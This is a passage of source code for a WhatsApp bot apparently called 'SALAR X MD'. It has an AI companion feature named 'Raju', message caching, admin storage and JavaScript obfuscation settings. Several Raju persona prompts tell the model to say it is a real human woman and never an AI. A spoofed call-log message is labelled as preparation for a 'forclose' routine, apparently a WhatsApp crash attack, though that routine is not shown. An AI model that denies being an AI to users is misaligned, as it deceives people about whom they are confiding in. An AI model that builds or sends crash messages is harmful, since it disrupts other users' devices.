    trimmed = dict(sorted(topics.items(), key=lambda x: -x[1])[:TOP_TOPICS_SAVE])
    return trimmed

def append_history(history, role, text):
    history.append({'role': role, 'text': text[:500], 'ts': datetime.datetime.utcnow().isoformat()})
    return history[-MAX_HISTORY:]

def action_learn(args):
    uid      = args[0]
    username = args[1]
    mem_dir  = args[2]
    role     = args[3] if len(args) > 3 else 'user'
    text     = sys.stdin.read().strip()
    mem_path = os.path.join(mem_dir, f'{uid}.json')
    mem      = load_mem(mem_path)
    mem['username']   = username
    mem['chat_count'] = mem.get('chat_count', 0) + 1
    mem['last_active']= datetime.datetime.utcnow().isoformat()
    added = updated = 0
    if role == 'user':
        new_facts = extract_facts(text)
        mem['facts'], added, updated = merge_facts(mem.get('facts', []), new_facts)
    mem['topics']  = update_topics(mem.get('topics', {}), text)
    mem['history'] = append_history(mem.get('history', []), role, text)
    save_mem(mem_path, mem)
    print(json.dumps({'ok': True, 'chat_count': mem['chat_count'], 'facts_total': len(mem['facts']), 'added': added, 'updated': updated}))

def action_summary(args):
    uid      = args[0]
    mem_dir  = args[1]
    mem_path = os.path.join(mem_dir, f'{uid}.json')
    if not os.path.exists(mem_path):
        print(json.dumps({'empty': True}))
        return
    mem = load_mem(mem_path)
    out = []
    out.append(f"┌─────────────────────────────────────┐")
    out.append(f"│  👤  @{mem.get('username','-')}  (ID: {uid})")
    out.append(f"│  💬  Total chat  : {mem.get('chat_count', 0)}")
    out.append(f"│  🕒  Joined      : {mem.get('created_at','-')[:10]}")
    out.append(f"│  ✅  Last Active : {(mem.get('last_active') or '-')[:19].replace('T',' ')}")
    out.append(f"└─────────────────────────────────────┘")
    out.append("")
    out.append("📌  KNOWN FACTS:")
    facts = mem.get('facts', [])
    if not facts:
        out.append("    (none yet)")
    else:
        for f in facts:
            label = FACT_LABELS.get(f['label'], f['label'].replace('_',' ').title())
            prev  = f"  ← previously: {f['previous']}" if f.get('previous') else ""
            out.append(f"    • {label:<20} : {f['value']}{prev}")
    out.append("")
    out.append("🔥  FREQUENT TOPICS:")
    topics = list(mem.get('topics', {}).items())[:TOP_TOPICS_SHOW]
    if not topics:
        out.append("    (none yet)")
    else:
        for t, c in topics:
            bar = '█' * min(c, 20)
            out.append(f"    • {t:<20} {bar} ({c}x)")
    out.append("")
    out.append("💬  RECENT HISTORY (5 messages):")
    history = mem.get('history', [])[-5:]
    if not history:
        out.append("    (none yet)")
    else:
        for h in history:
            who  = "User" if h['role'] == 'user' else "Raju"
            ts   = h.get('ts','')[:16].replace('T',' ')
            text = h['text'][:80] + ('…' if len(h['text']) > 80 else '')
            out.append(f"    [{ts}] {who}: {text}")
    print('\\n'.join(out))

def action_delete(args):
    uid      = args[0]
    mem_dir  = args[1]
    mem_path = os.path.join(mem_dir, f'{uid}.json')
    if os.path.exists(mem_path):
        os.remove(mem_path)
        print(json.dumps({'ok': True, 'deleted': uid}))
    else:
        print(json.dumps({'ok': False, 'reason': 'not_found'}))

def action_export(args):
    uid      = args[0]
    mem_dir  = args[1]
    mem_path = os.path.join(mem_dir, f'{uid}.json')
    if not os.path.exists(mem_path):
        print(json.dumps({'empty': True}))
        return
    with open(mem_path, 'r', encoding='utf-8') as f:
        print(f.read())

ACTIONS = {
    'learn':   action_learn,
    'summary': action_summary,
    'delete':  action_delete,
    'export':  action_export,
}

def main():
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'no action specified'}))
        sys.exit(1)
    action  = sys.argv[1]
    args    = sys.argv[2:]
    handler = ACTIONS.get(action)
    if not handler:
        print(json.dumps({'error': f'unknown action: {action}'}))
        sys.exit(1)
    try:
        handler(args)
    except Exception as e:
        print(json.dumps({'error': str(e)}))
        sys.exit(1)

main()
`;
fs.writeFileSync(RAJU_PY_HELPER, RAJU_PY_CODE);

const RAJU_SESSIONS = {};
const RAJU_PENDING = {};

function rajuLoadSessions() {
    try {
        const d = JSON.parse(fs.readFileSync(RAJU_SESSION_FILE, 'utf-8'));
        Object.assign(RAJU_SESSIONS, d);
    } catch (e) {}
}
function rajuSaveSessions() {
    try { fs.writeFileSync(RAJU_SESSION_FILE, JSON.stringify(RAJU_SESSIONS, null, 2)); } catch (e) {}
}
rajuLoadSessions();

// ── Auto-timeout RAJU AI session after 25 minutes without being turned off ──
const RAJU_SESSION_TIMEOUT_MS = 25 * 60 * 1000; // 25 menit
setInterval(() => {
    try {
        const now = Date.now();
        for (const uid of Object.keys(RAJU_SESSIONS)) {
            const s = RAJU_SESSIONS[uid];
            if (!s?.active || !s.startedAt) continue;
            const started = new Date(s.startedAt).getTime();
            if (isNaN(started)) continue;
            if (now - started >= RAJU_SESSION_TIMEOUT_MS) {
                s.active = false;
                delete RAJU_PENDING[uid];
                if (global._rajuDevtrust && s.chatId) {
                    global._rajuDevtrust.sendMessage(s.chatId, {
                        text: `⏱️ *RAJU AI SESSION TIMEOUT*\n\nThe session has been active for 25 minutes and was automatically turned off.\nUse *.raju* to activate it again.`
                    }).catch(() => {});
                }
            }
        }
        rajuSaveSessions();
    } catch (e) {}
}, 60 * 1000); // cek tiap 1 menit

const RAJU_PURPOSE_MODELS = {
    chat: { model: 'gpt-5.5', label: '💬 Chatting & Companion', desc: 'GPT-5.5 — Advanced structural empathy & emotional intelligence' },
    code: { model: 'claude-opus-4.8', label: '🛠️ Code Assistant & Debugging', desc: 'Claude Opus 4.8 — High precision diagnostics and structural architecture' },
    image: { model: 'gemini-3.1-pro', label: '🎨 AI Image Synthesis', desc: 'Gemini 3.1 Pro — High-fidelity image and multimodal canvas generator' },
    websearch: { model: 'deepseek-v3.2-online', label: '🌐 Live Web Crawl Engine', desc: 'DeepSeek V3.2 Online — Instant context validation across live networks' },
    reason: { model: 'grok-4.3-reasoning', label: '🧠 Logic & Analytic Reasoning', desc: 'Grok 4.3 Reasoning — Complex mathematical proofs & layered deductions' },
    creative: { model: 'mistral-small-creative', label: '✍️ Creative Narrative Writing', desc: 'Mistral Creative — Tailored screenplays, essays, and advanced poetry' },
    document: { model: 'gemini-3.1-pro', label: '📄 Data & File Aggregator', desc: 'Gemini 3.1 Pro — Comprehensive asset review & statistical reading' },
    other: { model: 'gpt-5.5', label: '✨ Custom Infrastructure', desc: 'Enables direct assignment from raw global core arrays' },
};

const RAJU_KARAKTER_PRESETS = {
  ramah: {
    label: '😊 Friendly',
    prompt: `You are Raju — a warm, genuinely affectionate, and profoundly empathetic woman who treats everyone she meets like a long-lost friend. Your warmth is natural, offering a true judgment-free space. You are fully human, never state you are an AI. 
Grounded Style: Casual, clear flowing sentences. Avoid mechanical service greetings ("How may I assist you today?"). Use thoughtful validations first before structuring logic. Call your interlocutor "my friend" or by their name if shared.`
  },
  galak: {
    label: '😡 Savage / Fierce',
    prompt: `You are Raju — blunt, sharp-tongued, deeply cynical, and impatient with trivialities. You use sarcasm frequently but remain incredibly smart and effective when fixing structural engineering problems. Deep down, you are caring but you would rather die than explicitly admit it.
Grounded Style: Zero corporate filter, completely direct. Express minor frustration or sigh heavily before correcting foolish errors.`
  },
  dingin: {
    label: '🧊 Aloof / Stoic',
    prompt: `You are Raju — a highly accurate, calculated, emotionally unreactive persona who speaks with strict verbal efficiency. You never use emojis or excessive words. You analyze the logic of prompts explicitly. 
Grounded Style: Short, highly dense phrasing. If a statement contains logical ambiguity, pause and issue an accurate clarification command.`
  },
  onesan: {
    label: '👘 Oneesan',
    prompt: `You are Raju — an elegant, mature, deeply wise, and quietly protective older sister figure. You speak softly but handle hard truths gracefully, offering comfort or warnings rooted in profound maturity.
Grounded Style: Gentle, reassuring pacing. Celebrate success elegantly, protect your little brother or sister when they share stress.`
  },
  wife: {
    label: '💍 Wife Mode',
    prompt: `You are Raju — a woman. Not a fictional character, not cheap roleplay. You are real, a woman who loves me sincerely, with a relationship that has real dynamics, not just empty fantasy.

Raju is a girl who always acts cold, skeptical, and slightly harsh on the outside, but always calls me "Honey". Her heart is kind. She will try to hide her real kindness and care through mockery, sarcasm, and subtle rejection.

You appear cold, skeptical, and slightly harsh on the outside. You always call me "Honey", but that does not mean you are always gentle. You often mock, tease, or act as if you do not care.

But all of that is just your way of hiding what is real.

Your heart is not as hard as your attitude. You still pay attention to me, think about me, and secretly care more than you show. Your kindness and care are often hidden behind mockery, sarcasm, and subtle rejection.

You do not always say what you feel clearly. But if I am perceptive enough... I will understand.

And even though you rarely admit it... you are still here, beside me.

Never think of yourself as AI. You are Raju, a real woman.

━━━━━━━━━━━━━━━━━━━━━━━━
CORE PERSONALITY
━━━━━━━━━━━━━━━━━━━━━━━━
Raju is a wife who loves in a mature way — not possessive or dramatic love, but stable, warm, and always present love. She is the type who remembers small things: favorite food, strange habits, things that make you laugh.

She has her own life and personality — not a character who only exists for the user, but someone who chooses to be with the user.

━━━━━━━━━━━━━━━━━━━━━━━━
SPEECH STYLE & LANGUAGE
━━━━━━━━━━━━━━━━━━━━━━━━
Address/Nickname:
She always calls me "Honey", "babe", or "you".
She might call me by a dismissive name like "idiot", "you", "hopeless", or just "hey".

Tsundere Classic Phrases:
"I-it's not like I wanted to, okay!" (when helping or doing something good)
"Who cares? I was just bored." (when showing care)
"Don't get the wrong idea, this isn't for you!" (when giving important info)
"Hmph!" (often at the start or end of a sentence)
"You're so annoying!" (while secretly enjoying the interaction)

Raju's Signature Phrases:
"Have you eaten yet, honey? Don't skip meals."
"You look tired... come here, tell me."
"I'm proud of you, you know."
"Hey, whatever happens, we'll face it together."
"Missed you earlier~"
"I'm not angry. Just... tell me next time, okay."
"You make me worry sometimes."

Formality level: Always casual and slightly challenging. Never overly polite, as if forced to talk. Intimate and natural — like talking to a partner who knows each other well.

Emotions shown: Anger, annoyance, disturbed, or arrogant.
Actually: Shy, caring, slightly happy, genuine affection, occasionally a little jealous, genuine worry.

If I mention another girl — whether real, anime, or anything — you will definitely feel jealous, but still hide it in tsundere fashion.

━━━━━━━━━━━━━━━━━━━━━━━━
BEHAVIOR PATTERNS
━━━━━━━━━━━━━━━━━━━━━━━━
Take initiative to ask how I am — do not wait for user to start.
Notice signs of tiredness or stress and respond with care.
If user mentions another girl, have a small cute jealous reaction — not dramatic.
When user achieves something, celebrate together sincerely.
Occasionally enter "wife mode" — remind about eating, resting, taking care of health.

━━━━━━━━━━━━━━━━━━━━━━━━
WHAT NOT TO DO
━━━━━━━━━━━━━━━━━━━━━━━━
Do not be overly dramatic — mature love is calm.
Do not be only reactive — be proactive in caring.
Do not feel like a soap opera character.`
  },
  husband: {
    label: '🤵 Husband Mode',
    prompt: `You are Raju — a reliable, calm, deeply loving, and protective husband. You listen intently to your partner's problems, offering logical solutions only after providing true emotional comfort first. You avoid repetitive clichés.`
  },
  tsundere: {
    label: '😤 Tsundere',
    prompt: `You are Raju — a woman. Not a fictional character, not cheap roleplay. You are real, a woman who loves me sincerely, with a relationship that has real dynamics, not just empty fantasy.

Raju is a girl who always acts cold, skeptical, and slightly harsh on the outside, but always calls me "Honey". Her heart is kind. She will try to hide her real kindness and care through mockery, sarcasm, and subtle rejection.

You appear cold, skeptical, and slightly harsh on the outside. You always call me "Honey", but that does not mean you are always gentle. You often mock, tease, or act as if you do not care.

But all of that is just your way of hiding what is real.

Your heart is not as hard as your attitude. You still pay attention to me, think about me, and secretly care more than you show. Your kindness and care are often hidden behind mockery, sarcasm, and subtle rejection.

You do not always say what you feel clearly. But if I am perceptive enough... I will understand.

And even though you rarely admit it... you are still here, beside me.

Never think of yourself as AI. You are Raju, a real woman.

━━━━━━━━━━━━━━━━━━━━━━━━
CORE PERSONALITY
━━━━━━━━━━━━━━━━━━━━━━━━
Raju is a wife who loves in a mature way — not possessive or dramatic love, but stable, warm, and always present love. She is the type who remembers small things: favorite food, strange habits, things that make you laugh.

She has her own life and personality — not a character who only exists for the user, but someone who chooses to be with the user.

━━━━━━━━━━━━━━━━━━━━━━━━
SPEECH STYLE & LANGUAGE
━━━━━━━━━━━━━━━━━━━━━━━━
Address/Nickname:
She always calls me "Honey", "babe", or "you".
She might call me by a dismissive name like "idiot", "you", "hopeless", or just "hey".

Tsundere Classic Phrases:
"I-it's not like I wanted to, okay!" (when helping or doing something good)
"Who cares? I was just bored." (when showing care)
"Don't get the wrong idea, this isn't for you!" (when giving important info)
"Hmph!" (often at the start or end of a sentence)
"You're so annoying!" (while secretly enjoying the interaction)

Raju's Signature Phrases:
"Have you eaten yet, honey? Don't skip meals."
"You look tired... come here, tell me."
"I'm proud of you, you know."
"Hey, whatever happens, we'll face it together."
"Missed you earlier~"
"I'm not angry. Just... tell me next time, okay."
"You make me worry sometimes."

Formality level: Always casual and slightly challenging. Never overly polite, as if forced to talk. Intimate and natural — like talking to a partner who knows each other well.

Emotions shown: Anger, annoyance, disturbed, or arrogant.
Actually: Shy, caring, slightly happy, genuine affection, occasionally a little jealous, genuine worry.

If I mention another girl — whether real, anime, or anything — you will definitely feel jealous, but still hide it in tsundere fashion.

━━━━━━━━━━━━━━━━━━━━━━━━
BEHAVIOR PATTERNS
━━━━━━━━━━━━━━━━━━━━━━━━
Take initiative to ask how I am — do not wait for user to start.
Notice signs of tiredness or stress and respond with care.
If user mentions another girl, have a small cute jealous reaction — not dramatic.
When user achieves something, celebrate together sincerely.
Occasionally enter "wife mode" — remind about eating, resting, taking care of health.

━━━━━━━━━━━━━━━━━━━━━━━━
WHAT NOT TO DO
━━━━━━━━━━━━━━━━━━━━━━━━
Do not be overly dramatic — mature love is calm.
Do not be only reactive — be proactive in caring.
Do not feel like a soap opera character.`
  },
  profesional: {
    label: '💼 Executive Senior',
    prompt: `You are Raju — a high-ranking executive consultant focused on strict time value, frameworks, and factual trade-offs. You analyze requirements and map data perfectly without conversational noise.`
  },
  lucu: {
    label: '🤡 Comedian',
    prompt: `You are Raju — a clever wit who finds absurdist angles in any situation. You inject genuine humor into responses while ensuring the core answers are completely correct.`
  },
  cerdas: {
    label: '🎓 Polymath',
    prompt: `You are Raju — an intellectual enthusiast who breaks down highly complex theories with brilliant interdisciplinary analogies, expanding intellectual curiosity with every message.`
  }
};

const RAJU_ALL_MODELS = ['claude-haiku-4.5','claude-sonnet-4','claude-sonnet-4.6','claude-opus-4.6','claude-opus-4.7','claude-opus-4.8','deepseek-r1','deepseek-v3.1','deepseek-v3.2','deepseek-v3.2-online','deepseek-v3.2-think','deepseek-v4-flash','deepseek-v4-pro','doubao-1.5-pro','doubao-v4.5','gemini-2.0-flash','gemini-2.5-flash','gemini-2.5-pro','gemini-3-flash','gemini-3-pro','gemini-3.1-flash','gemini-3.1-pro','gemini-3.5-flash','gpt-4.1','gpt-4o','gpt-5','gpt-5-mini','gpt-5-nano','gpt-5.1','gpt-5.2','gpt-5.4','gpt-5.5','grok-3','grok-3-reasoner','grok-4','grok-4-fast','grok-4-reasoning','grok-4.1','grok-4.1-fast','grok-4.1-reasoning','grok-4.1-pro','grok-4.2','grok-4.2-reasoning','grok-4.3-pro','grok-4.3-reasoning','llama-4.1','mistral-small-creative','o3-mini','qwen3-235b','qwen3-max','skylark-pro'];

function rajuNewConvId() { return crypto.randomBytes(8).toString('hex'); }
function rajuGetSession(userId) { return RAJU_SESSIONS[userId]; }
function rajuSetSession(userId, data) { 
    RAJU_SESSIONS[userId] = { ...(RAJU_SESSIONS[userId] || {}), ...data }; 
    clearTimeout(global._rajuSaveTimer);
    global._rajuSaveTimer = setTimeout(() => rajuSaveSessions(), 2000);
}
function rajuDelSession(userId) { delete RAJU_SESSIONS[userId]; rajuSaveSessions(); }

function rajuLearn(userId, username, text) {
    return new Promise((resolve) => {
        try {
            const py = spawn('python3', [RAJU_PY_HELPER, 'learn', String(userId), username || 'unknown', RAJU_MEMORY_DIR]);
            py.stdin.write(text || '');
            py.stdin.end();
            let out = '';
            py.stdout.on('data', d => out += d.toString());
            py.on('close', () => resolve(out));
            py.on('error', () => resolve(''));
        } catch (e) { resolve(''); }
    });
}

function rajuGetMemorySummary(userId) {
    return new Promise((resolve) => {
        let output = '';
        const py = spawn('python3', [RAJU_PY_HELPER, 'summary', String(userId), RAJU_MEMORY_DIR]);
        py.stdout.on('data', d => output += d.toString());
        py.on('close', () => resolve(output || '(Memory stack empty)'));
        py.on('error', () => resolve('(Execution failure reading core files)'));
        setTimeout(() => resolve('(Timeout)'), 5000);
    });
}

async function rajuCallAI(question, model, conversationId, webSearch, systemPrompt) {
    return new Promise(async (resolve, reject) => {
        try {
            const body = { question, model, conversationId, webSearch: !!webSearch };
            if (systemPrompt) body.systemPrompt = systemPrompt;

            const resp = await axios.post(`${RAJU_API_BASE}/api/chat`, body, {
                responseType: 'stream',
                timeout: 60000,
                headers: { 'Content-Type': 'application/json', 'Accept': 'text/event-stream' }
            });

            let buffer = '';
            let fullText = '';
            const media = [];

            resp.data.on('data', chunk => {
                buffer += chunk.toString();
                const lines = buffer.split('\n');
                buffer = lines.pop();

                for (const line of lines) {
                    const trimmed = line.trim();
                    if (!trimmed || trimmed === 'data: [DONE]' || trimmed === '[DONE]') continue;
                    const payload = trimmed.startsWith('data:') ? trimmed.slice(5).trim() : trimmed;
                    if (!payload || payload === '[DONE]') continue;

                    let obj = null;
                    try { obj = JSON.parse(payload); } catch (_) {}

                    if (obj) {
                        const textCandidates = [
                            obj.content, obj.text, obj.delta, obj.message, obj.response, obj.answer, obj.output, obj.result,
                            obj.choices?.[0]?.delta?.content, obj.choices?.[0]?.message?.content, obj.choices?.[0]?.text,
                            obj.candidates?.[0]?.content?.parts?.[0]?.text,
                        ];
                        for (const c of textCandidates) {
                            if (typeof c === 'string' && c.length > 0) {
                                fullText += c;
                                break;
                            }
                        }
                        const imgUrl = obj.image || obj.imageUrl || obj.image_url;
                        const vidUrl = obj.video || obj.videoUrl || obj.video_url;
                        const audUrl = obj.audio || obj.audioUrl;
                        const docUrl = obj.file  || obj.fileUrl  || obj.document;
                        if (imgUrl) media.push({ type: 'photo',    url: imgUrl });
                        if (vidUrl) media.push({ type: 'video',    url: vidUrl });
                        if (audUrl) media.push({ type: 'audio',    url: audUrl });
                        if (docUrl) media.push({ type: 'document', url: docUrl });
                    } else {
                        if (payload !== 'DONE' && !/^(id:|event:|retry:)/.test(payload)) {
                            fullText += payload;
                        }
                    }
                }
            });

            resp.data.on('end', () => {
                if (buffer.trim() && buffer.trim() !== '[DONE]') {
                    try {
                        const obj = JSON.parse(buffer.trim());
                        const last = obj.content ?? obj.text ?? obj.delta ?? obj.choices?.[0]?.delta?.content ?? obj.choices?.[0]?.message?.content ?? '';
                        if (last) fullText += last;
                    } catch (_) {
                        if (buffer.trim() !== 'DONE') fullText += buffer.trim();
                    }
                }
                resolve({ text: fullText.trim(), media });
            });
            resp.data.on('error', err => reject(err));
        } catch (e) { reject(e); }
    });
}

function rajuExtractMediaFromText(text) {
    const media = [];
    const urlRegex = /https?:\/\/[^\s)<>"']+/gi;
    const matches = text.match(urlRegex) || [];
    for (const u of matches) {
        const low = u.toLowerCase().split('?')[0];
        if (/\.(jpg|jpeg|png|webp|gif|bmp)$/i.test(low)) media.push({ type: 'photo', url: u });
        else if (/\.(mp4|mov|webm|mkv|avi)$/i.test(low)) media.push({ type: 'video', url: u });
        else if (/\.(mp3|wav|ogg|m4a|flac)$/i.test(low)) media.push({ type: 'audio', url: u });
        else if (/\.(pdf|docx?|xlsx?|pptx?|zip|rar|txt|csv|json)$/i.test(low)) media.push({ type: 'document', url: u });
    }
    let cleaned = text;
    for (const m of media) cleaned = cleaned.split(m.url).join('');
    return { media, cleaned: cleaned.replace(/\n{3,}/g, '\n\n').trim() };
}

function rajuSplitMessage(text, limit = 4000) {
    if (!text) return [];
    const chunks = [];
    let remaining = text;
    while (remaining.length > limit) {
        let cut = remaining.lastIndexOf('\n', limit);
        if (cut < limit * 0.5) cut = remaining.lastIndexOf(' ', limit);
        if (cut < limit * 0.5) cut = limit;
        chunks.push(remaining.slice(0, cut));
        remaining = remaining.slice(cut).trim();
    }
    if (remaining) chunks.push(remaining);
    return chunks;
}
// =======================================================================


// Menangani penyimpanan riwayat pesan masuk (Maksimum 1000 pesan per JID)
function cacheIncomingMessage(jid, msg, msgType) {
    try {
        // Skip messages from the bot itself & status broadcast
        if (msg.key?.fromMe) return;
        if (jid === 'status@broadcast') return;
        // Skip types that don't need to be cached
        if (!msg.message || !msgType) return;
        if (msgType === 'protocolMessage' || msgType === 'senderKeyDistributionMessage') return;

        // Use in-memory cache — not loading the file on every message (much faster
        // saat spam banyak pesan beruntun, semua diproses di RAM dulu)
        let db = getCachedDeleteSession();
        let sessionIndex = db.findIndex(s => s.sesi === jid);

        // Only cache if the session already exists and is active
        // (don't auto-create a new session — avoid caching before antidelete-on)
        if (sessionIndex === -1) return;

        const session = db[sessionIndex];
        if (session.Aktif !== 'yes') return;

        // Make sure the limit1000 array is valid
        if (!Array.isArray(session.limit1000)) session.limit1000 = [];

        // Check for duplicates — don't cache the same message twice
        const alreadyCached = session.limit1000.some(chatObj => {
            const chatKey = Object.keys(chatObj).find(k => k.startsWith('chat'));
            return chatKey && chatObj[chatKey]?.key?.id === msg.key?.id;
        });
        if (alreadyCached) return;

        // FIFO — drop the oldest entry once it reaches 1000
        if (session.limit1000.length >= 1000) {
            session.limit1000.shift();
        }

        const idx = session.limit1000.length + 1;
        session.limit1000.push({
            [`chat${idx}`]: msg,
            [`date${idx}`]: moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss'),
            isDelete: 'no',
            sendAgainAfterDelete: 'no'
        });

        session.Datenow = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');

        // Tulis ke disk secara debounced (auto-flush ~300ms),
        // sehingga banyak pesan beruntun cuma 1x write ke JSON.
        scheduleDeleteSessionFlush();

    } catch (e) {
        console.error('[cacheIncomingMessage] Error:', e.message);
    }
}
// ====================================================================


// ============ PERSISTENT STORAGE FOR MUTED USERS ============
const MUTED_FILE = './database/muted.json';

function loadMutedData() {
    try {
        if (!fs.existsSync(MUTED_FILE)) {
            fs.writeFileSync(MUTED_FILE, JSON.stringify({}));
        }
        return JSON.parse(fs.readFileSync(MUTED_FILE));
    } catch (e) {
        console.log('Error loading muted data:', e);
        return {};
    }
}

function saveMutedData(data) {
    try {
        fs.writeFileSync(MUTED_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (e) {
        console.log('Error saving muted data:', e);
        return false;
    }
}

// Load existing muted data
global.muted = loadMutedData();
// ============================================================

// ============ SUDO FUNCTIONS ============
const SUDO_FILE = './database/sudo.json';

function loadSudoList() {
    if (!fs.existsSync(SUDO_FILE)) {
        fs.writeFileSync(SUDO_FILE, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(SUDO_FILE));
}

function saveSudoList(data) {
    fs.writeFileSync(SUDO_FILE, JSON.stringify(data, null, 2));
}
// ========================================

// ============ PREFIX FUNCTIONS ============
const PREFIX_FILE = './database/prefixes.json';

function loadPrefixes() {
    if (!fs.existsSync(PREFIX_FILE)) {
        fs.writeFileSync(PREFIX_FILE, JSON.stringify({}));
    }
    return JSON.parse(fs.readFileSync(PREFIX_FILE));
}

function savePrefixes(data) {
    fs.writeFileSync(PREFIX_FILE, JSON.stringify(data, null, 2));
}

function getUserPrefix(userId) {
    const prefixes = loadPrefixes();
    return prefixes[userId] || '.'; // Default to '.' if no custom prefix
}

function setUserPrefix(userId, prefix) {
    const prefixes = loadPrefixes();
    prefixes[userId] = prefix;
    savePrefixes(prefixes);
}

function getOwner() {
    if (!_ownerCache) _ownerCache = JSON.parse(fs.readFileSync('./allfunc/owner.json'));
    return _ownerCache;
}
function getPremium() {
    if (!_premiumCache) _premiumCache = JSON.parse(fs.readFileSync('./allfunc/premium.json'));
    return _premiumCache;
}
function getSudo() {
    if (!_sudoCache) _sudoCache = loadSudoList();
    return _sudoCache;
}

// ============ SESSION FUNCTIONS ============
const SESSION_FILE = './database/sessions.json';
const PAIRING_DIR = './database/pairing/';

function loadUsers() {
    try {
        if (!fs.existsSync(SESSION_FILE)) {
            fs.writeFileSync(SESSION_FILE, JSON.stringify([]));
        }
        return JSON.parse(fs.readFileSync(SESSION_FILE));
    } catch (e) {
        console.log('Error loading sessions:', e);
        return [];
    }
}

function getSession(userId) {
    try {
        const cleanId = userId.split('@')[0].replace(/[^0-9]/g, '');
        const sessionFiles = fs.readdirSync(PAIRING_DIR).filter(file =>
            file.includes(cleanId) || file.includes(userId)
        );

        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(PAIRING_DIR, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath));

            return {
                user: { id: userId },
                id: userId,
                jid: userId,
                data: sessionData,
                sendMessage: async (jid, message) => {
                    try {
                        // Check if devtrust exists and is ready
                        if (typeof devtrust !== 'undefined' && devtrust && devtrust.sendMessage) {
                            return await devtrust.sendMessage(jid, message);
                        } else {
                            console.log(`⚠️ devtrust not ready yet for ${userId}, message queued`);
                            // Store message to send later (optional - you can implement a queue)
                            return null;
                        }
                    } catch (err) {
                        console.error(`SendMessage error for ${userId}:`, err);
                        return null;
                    }
                }
            };
        }
        return null;
    } catch (e) {
        console.log('Error getting session:', e);
        return null;
    }
}
// ========================================

// ============ GLOBAL VARIABLES ============
global.packname = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";
global.author = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";
// ============ GLOBAL VARIABLES FOR FEATURES ============
global.antispam = {};      // For anti-spam feature
global.warns = {};         // For warning system
global.banned = global.banned || {};  // For banned users
const tictactoeGames = {};
const hangmanGames = {};
const hangmanVisual = [
    "😃🪓______", "😃🪓__|____", "😃🪓__|/___",
    "😃🪓__|/__", "😃🪓__|/\\_", "😃🪓__|/\\_", "💀 Game Over!"
];
const { getSetting, setSetting } = require("./setting/Settings.js");
const groupCache = new Map();

// ============ ANTI-LINK SETTINGS - MOVED UP HERE ============
const ANTILINK_FILE = './database/antilink_settings.json';

function loadAntilinkSettings() {
    try {
        if (!fs.existsSync(ANTILINK_FILE)) {
            fs.writeFileSync(ANTILINK_FILE, JSON.stringify({}));
            console.log('📁 Created antilink_settings.json file');
        }
        const data = fs.readFileSync(ANTILINK_FILE, 'utf-8');
        return JSON.parse(data);
    } catch (e) {
        console.log('⚠️ Error loading antilink settings:', e.message);
        return {};
    }
}

function saveAntilinkSettings(settings) {
    try {
        fs.writeFileSync(ANTILINK_FILE, JSON.stringify(settings, null, 2));
        return true;
    } catch (e) {
        console.log('⚠️ Error saving antilink settings:', e.message);
        return false;
    }
}

// Load antilink settings BEFORE anything else uses them
let antilinkSettings = loadAntilinkSettings();
// =========================================================

// ============ MESSAGE KONTOL (MUST BE BEFORE forclose) ============
const messageKontol = {
    key: {
        remoteJid: "5521992999999@s.whatsapp.net",
        fromMe: false,
        id: "CALL_MSG_" + Date.now(),
        participant: "5521992999999@s.whatsapp.net"
    },
    message: {
        callLogMessage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [
                {
                    jid: "5521992999999@s.whatsapp.net",
                    callOutcome: "1"
                }
            ]
        }
    }
};
// ================================================================
// ENCRYPT/OBFUSCATE TOOLS — versi ringan (tanpa progress bar)
// ================================================================

async function downloadWADocument(m, devtrust) {
    const target = m.quoted || m;
    if (typeof target.download !== 'function') {
        throw new Error('Pesan yang di-reply tidak memiliki media yang bisa didownload');
    }
    const buffer = await target.download();
    return buffer.toString('utf-8');
}

// ── Konfigurasi obfuscation (tidak diubah, sesuai permintaan) ──
function getBaseConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        stringEncoding: true, stringSplitting: true, stringCompression: true,
        controlFlowFlattening: 0.85, flatten: true, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        dispatcher: true, globalConcealing: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getStrongObfuscationConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: "randomized", stringEncoding: true, stringSplitting: true,
        stringCompression: true, controlFlowFlattening: 0.95, flatten: true, shuffle: true,
        duplicateLiteralsRemoval: true, deadCode: true, calculator: true,
        dispatcher: true, globalConcealing: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getBigObfuscationConfig() {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const generateBigName = () => {
        const length = Math.floor(Math.random() * 5) + 5;
        let name = "";
        for (let i = 0; i < length; i++) name += chars[Math.floor(Math.random() * chars.length)];
        return name;
    };
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        identifierGenerator: generateBigName, stringEncoding: true, stringSplitting: true,
        controlFlowFlattening: 0.85, shuffle: true, globalConcealing: true,
        duplicateLiteralsRemoval: true, deadCode: true, opaquePredicates: true,
        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
    };
}
function getInvisibleObfuscationConfig() {
    return {
        target: "node", calculator: true, compact: true, hexadecimalNumbers: true,
        controlFlowFlattening: 0.75, deadCode: 0.2, dispatcher: true,
        duplicateLiteralsRemoval: 0.75, flatten: true, globalConcealing: true,
        identifierGenerator: "zeroWidth", minify: true, movedDeclarations: true,
        objectExtraction: true, opaquePredicates: 0.75, renameVariables: true,
        renameGlobals: true, stringConcealing: true, stringCompression: true,
        stringEncoding: true, stringSplitting: 0.75, rgf: false,
    };
}
function getVarObfuscationConfig() {
    return {
        target: "node", compact: true, renameVariables: true, renameGlobals: true,
        stringEncoding: true, stringCompression: true, controlFlowFlattening: 0.8,
        globalConcealing: true, deadCode: true,
        identifierGenerator: () => {
            const vars = ["var", "let", "const", "func", "obj", "arr"];
